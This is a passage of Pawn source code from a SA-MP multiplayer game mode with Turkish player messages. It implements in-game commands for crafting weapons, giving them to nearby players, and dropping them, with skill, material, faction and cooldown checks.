        if(PlayerInfo[playerid][pArmsSkill] < 200) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 20999) {
            weapon = 31; price = 21000;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else if(strcmp(x_weapon,"rifle",true) == 0) {
        if(PlayerInfo[playerid][pArmsSkill] < 50) return SendClientMessage(playerid, COLOR_GREY, "Bunu yapmak için yeterli Level'a sahip deðilsin!");
        if(PlayerInfo[playerid][pMats] > 4499) {
            weapon = 33; price = 4500;
        }
        else {
            SendClientMessage(playerid,COLOR_GREY,"Bu silah için yeterli materyalin yok!");
            return 1;
        }
    }

    else { SendClientMessage(playerid,COLOR_GREY,"   Geçersiz silah ismi!"); return 1; }
    if(ProxDetectorS(5.0, playerid, giveplayerid)) {
        if(PlayerInfo[giveplayerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun silah bulundurmasý yasaklanmýþ!");

        if(giveplayerid == playerid) {
            format(string, sizeof(string), "   You have given yourself a %s.", x_weapon);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            SendClientMessage(playerid, COLOR_GRAD1, string);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            switch(PlayerInfo[playerid][pSex])
			{
                case 1: format(string, sizeof(string), "* %s Materyallerden bir silah yaptý ve kendisine verdi.", GetPlayerNameEx(playerid));
                case 2: format(string, sizeof(string), "* %s Materyallerden bir silah yaptý ve kendisine verdi.", GetPlayerNameEx(playerid));
            }
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            GivePlayerValidWeapon(playerid,weapon,50000);
            PlayerInfo[playerid][pMats] -= price;
            if(weapon > 15) {
                #if defined DOUBLE_EXP_ENABLED
					new hour,minuite,second;
					gettime(hour,minuite,second);
					if(DoubleEXPcheck(hour))
					{
				    	PlayerInfo[playerid][pArmsSkill] += 2;
				    	SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
					}
					else
					{
						SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
						PlayerInfo[playerid][pArmsSkill]++;
					}
				#else
					PlayerInfo[playerid][pArmsSkill]++;
				#endif
            }

            SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);

            if(PlayerInfo[playerid][pArmsSkill] == 50)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 2 oldu, daha çok silah çeþidi artýk açýk."); }
            else if(PlayerInfo[playerid][pArmsSkill] == 100)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 3 oldu, daha çok silah çeþidi artýk açýk."); }
            else if(PlayerInfo[playerid][pArmsSkill] == 200)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 4 oldu, daha çok silah çeþidi artýk açýk."); }
            else if(PlayerInfo[playerid][pArmsSkill] == 400)
            { SendClientMessage(playerid, COLOR_YELLOW, "* Silah Satýcýsý yeteneðiniz Level 5 oldu, daha çok silah çeþidi artýk açýk."); }
            return 1;
        }

        format(string, sizeof(string), "* %s kiþisine %s satmayý önerdin.", GetPlayerNameEx(giveplayerid), x_weapon);
        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
        format(string, sizeof(string), "* Silah Satýcýsý %s sana %s satmayý önerdi, (/kabulet silah) yazarak satýn alabilirsin.", GetPlayerNameEx(playerid), x_weapon);
        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
        GunOffer[giveplayerid] = playerid;
        GunId[giveplayerid] = weapon;
        GunMats[giveplayerid] = price;

        SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
    }
    else
	{
        SendClientMessage(playerid, COLOR_GREY, "Oyuncu yanýnda deðil.");
        return 1;
    }
	return 1;
}

CMD:silahver(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

	if(GetPVarInt(playerid, "PBM") > 0)
		return SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");

	if(GetPVarInt(playerid, "EventToken") != 0)
		return SendClientMessage(playerid, COLOR_GREY, "Etkinlikteyken bunu kullanamazsýn.");

	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0||GetPlayerState(playerid) == 7)
		return SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage (playerid, COLOR_GRAD2, "Arabadayken silah veremezsin!");

	new
		Float:health,
		string[128];

	GetPlayerHealth(playerid, health);

	if(health < 80)
		return SendClientMessage(playerid, COLOR_GRAD1, "Canýn 80'in altýndayken silah veremezsin!");

	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0) {
		format(string, sizeof(string), "Baþka silah vermeden önce %d saniye beklemelisin.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	new
		giveplayerid,
		weapon[64];

	if(sscanf(params, "us[64]", giveplayerid, weapon)) {
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /silahver [Oyuncu ID/Ýsim] [weapon name]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: sdpistol, shotgun, 9mm, mp5, uzi, tec9, rifle, deagle, ak47, m4, spas12, sniper");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Flowers(Buglu), knuckles, baseballbat, cane, shovel, poolcue, golfclub, katana, dildo, parachute");
		return 1;
	}

	if(giveplayerid == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Online olmayan kullanýcýya silah veremezsin.");

	if(IsPlayerInAnyVehicle(giveplayerid))
		return SendClientMessage (playerid, COLOR_GRAD2, "Arabadayken oyunculara silah veremezsin!");

	if(giveplayerid == playerid)
		return SendClientMessage(playerid, COLOR_GRAD1, "Kendine silah veremezsin!");

	if(!ProxDetectorS(3.0, playerid, giveplayerid))
		return SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");

	if(PlayerInfo[playerid][pFaction] != PlayerInfo[giveplayerid][pFaction] && PlayerInfo[playerid][pFaction] > 0)
		return SendClientMessage(playerid, COLOR_GRAD1, "Kuruluþunun dýþýndaki oyunculara silah veremezsin!");

	if(PlayerInfo[giveplayerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun silah bulundurmasý yasaklanmýþ.");

	if(IsPlayerInAnyVehicle(giveplayerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmadan önce araçtan in.");

	if(strcmp(weapon, "9mm", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 22)
		{
			if(PlayerInfo[giveplayerid][pGuns][2] != 22 && PlayerInfo[giveplayerid][pGuns][2] != 23 && PlayerInfo[giveplayerid][pGuns][2] != 24)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, " 9mm pistol'ünü verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine 9mm pistol verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 22);
				GivePlayerValidWeapon(giveplayerid, 22, 60000);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "sdpistol", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23)
		{
			if(PlayerInfo[giveplayerid][pGuns][2] != 22 && PlayerInfo[giveplayerid][pGuns][2] != 23 && PlayerInfo[giveplayerid][pGuns][2] != 24)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, " silenced pistol'ünü verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine silenced pistol verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 23);
				GivePlayerValidWeapon(giveplayerid, 23, 60000);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "deagle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24)
		{
			if(PlayerInfo[giveplayerid][pGuns][2] != 22 && PlayerInfo[giveplayerid][pGuns][2] != 23 && PlayerInfo[giveplayerid][pGuns][2] != 24)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Desert Eagle'ýný verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine Desert Eagle verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 24);
				GivePlayerValidWeapon(giveplayerid, 24, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "shotgun", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25)
		{
			if(PlayerInfo[giveplayerid][pGuns][3] != 25 && PlayerInfo[giveplayerid][pGuns][3] != 27)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Shotgun'ýný verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine Shotgun verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 25);
				GivePlayerValidWeapon(giveplayerid, 25, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "spas12", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27)
		{
			if(PlayerInfo[giveplayerid][pGuns][3] != 25 && PlayerInfo[giveplayerid][pGuns][3] != 27)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "SPAS-12'ni verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine SPAS-12 verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 27);
				GivePlayerValidWeapon(giveplayerid, 27, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "mp5", true) == 0) {
		if(PlayerInfo[playerid][pGuns][4] == 29)
		{
			if(PlayerInfo[giveplayerid][pGuns][4] != 28 && PlayerInfo[giveplayerid][pGuns][4] != 29 && PlayerInfo[giveplayerid][pGuns][4] != 32)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "MP5'ini verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine MP5 verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 29);
				GivePlayerValidWeapon(giveplayerid, 29, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "uzi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 28)
		{
			if(PlayerInfo[giveplayerid][pGuns][4] != 28 && PlayerInfo[giveplayerid][pGuns][4] != 29 && PlayerInfo[giveplayerid][pGuns][4] != 32)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Micro SMG'ni verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine Micro SMG verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 28);
				GivePlayerValidWeapon(giveplayerid, 28, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "tec9", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 32)
		{
			if(PlayerInfo[giveplayerid][pGuns][4] != 28 && PlayerInfo[giveplayerid][pGuns][4] != 29 && PlayerInfo[giveplayerid][pGuns][4] != 32)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Tec-9'unu verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine Tec-9 verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 32);
				GivePlayerValidWeapon(giveplayerid, 32, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "ak47", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30)
		{
			if(PlayerInfo[giveplayerid][pGuns][5] != 30 && PlayerInfo[giveplayerid][pGuns][5] != 31)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "AK-47'ni verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine AK-47 verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 30);
				GivePlayerValidWeapon(giveplayerid, 30, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "m4", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31)
		{
			if(PlayerInfo[giveplayerid][pGuns][5] != 30 && PlayerInfo[giveplayerid][pGuns][5] != 31)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "M4'ünü verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine M4 verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 31);
				GivePlayerValidWeapon(giveplayerid, 31, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "rifle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33)
		{
			if(PlayerInfo[giveplayerid][pGuns][6] != 33 && PlayerInfo[giveplayerid][pGuns][6] != 34)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Rifle'ýný verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine rifle verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 33);
				GivePlayerValidWeapon(giveplayerid, 33, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}

	else if(strcmp(weapon, "sniper", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34)
		{
			if(PlayerInfo[giveplayerid][pGuns][6] != 33 && PlayerInfo[giveplayerid][pGuns][6] != 34)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Sniper rifle'ýný verdin.");
				format(string, sizeof(string), "* %s, %s kiþisine sniper rifle verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				RemovePlayerWeapon(playerid, 34);
				GivePlayerValidWeapon(giveplayerid, 34, 60000);
				SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu zaten benzer bir silaha sahip!");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "Flowers(Buglu)", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 14)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Flowers(Buglu) verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine Flowers(Buglu) verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 14);
			GivePlayerValidWeapon(giveplayerid, 14, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "knuckles", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][0] == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Brass knuckles'ýný verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine brass knuckles verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 1);
			GivePlayerValidWeapon(giveplayerid, 1, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "baseballbat", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Baseball bat'ini verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine baseball bat verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 5);
			GivePlayerValidWeapon(giveplayerid, 5, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "cane", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Cane'ini verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine cane verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 15);
			GivePlayerValidWeapon(giveplayerid, 15, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "shovel", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Shovel'ýný verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine shovel verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 6);
			GivePlayerValidWeapon(giveplayerid, 6, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "golfclub", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Golf club'ýný verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine golf club verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 2);
			GivePlayerValidWeapon(giveplayerid, 2, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "katana") == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Katana'ný verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine katana verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 8);
			GivePlayerValidWeapon(giveplayerid, 8, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "dildo", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Dildo'nu verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine dildo verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 10);
			GivePlayerValidWeapon(giveplayerid, 10, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else if(strcmp(weapon, "parachute", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][11] == 46)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Paraþütünü verdin.");
			format(string, sizeof(string), "* %s, %s kiþisine paraþüt verdi.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 46);
			GivePlayerValidWeapon(giveplayerid, 46, 60000);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu silaha sahip deðilsin!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz bir silah ismi girdin.");
	}

	return 1;
}

CMD:yoketsilah(playerid, params[])
{
	return cmd_silahyoket(playerid, params);
}

CMD:silahyoket(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /silahyoket [silah ismi]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: sdpistol, shotgun, 9mm, mp5, uzi, tec9, rifle, deagle, ak47, m4, spas12, sniper, kamera");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: cicekler, knuckles, bezbolsopasi, baston, kurek, istaka, golfsopasi, katana, dildo, parachute");
		if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: knife");
		}
		if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: cop, sprey, smoke, testere, yanginsondurucu");
		}
		return 1;
	}

	if(PlayerCuffed[playerid] >= 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Kelepçeliyken/þokluyken bu komutu kullanamazsýn.");

	if(IsPlayerInAnyVehicle(playerid))
	{
		SendClientMessage (playerid, COLOR_GRAD2, "Araçtayken silahýný atamazsýn!");
		return 1;
	}
	if(GetPVarInt(playerid, "PBM") > 0)
	{
